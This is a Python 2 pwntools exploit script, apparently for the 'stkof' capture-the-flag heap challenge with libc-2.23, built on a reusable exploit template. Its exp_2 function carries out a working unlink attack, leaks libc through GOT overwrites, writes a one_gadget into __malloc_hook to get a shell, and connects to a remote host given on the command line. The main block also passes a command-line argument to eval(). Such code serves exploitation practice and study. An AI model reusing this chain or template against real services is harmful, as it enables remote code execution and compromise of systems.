#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from elftools.construct import lib
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./stkof"                                   # 本地ELF
    pro_libc = "libc-2.23.so"       # Libc文件
    rem_libc = "./libc-2.23.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

def new(size):
    sh.sendline("1")
    sh.sendline(str(size))

def edit(idx,length,content):
    sh.sendline('2')
    sh.sendline(str(idx))
    sh.sendline(str(length))
    sh.send(content)

def delete(idx):
    sh.sendline('3')
    sh.sendline(str(idx))

def show(idx):
    sh.sendline('4')
    sh.sendline(str(idx))

def exp():

   	"""
   	...EXP...
    success("info_success")								# 正确提示信息
    info("info_info")									# 提示信息
    info.progress("info_progress")						# 加载信息
    debug()												# 加载GDB调试
   	"""
    
def exp_2():
    p_list=0x602150
    new(0x10)
    
    new(0x80)
    new(0x80)
    edit(2,0x90,p64(0)+p64(0x81)+p64(p_list-0x18)+p64(p_list-0x10)+'\x00'*0x60+p64(0x80)+p64(0x90))
    delete(3)

    puts_plt=elf.plt['puts']
    strlen_got=elf.got['strlen']
    puts_got=elf.got['puts']
    edit(2,0x18,'a'*0x10+p64(strlen_got))
    edit(1,0x8,p64(puts_plt))
    edit(2,0x18,'a'*0x10+p64(puts_got))
    show(1)
    puts_got=u64(sh.recvuntil("...",drop=False)[-10:-4].ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    one_addr=libc_base+one_gadget("libc-2.23.so")[1]
    info("one_addr: "+hex(one_addr))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))

    edit(2,0x18,'a'*0x10+p64(malloc_hook))
    edit(1,0x8,p64(one_addr))

    new(0x20)    


    

    # debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp_2()
    sh.interactive()
    

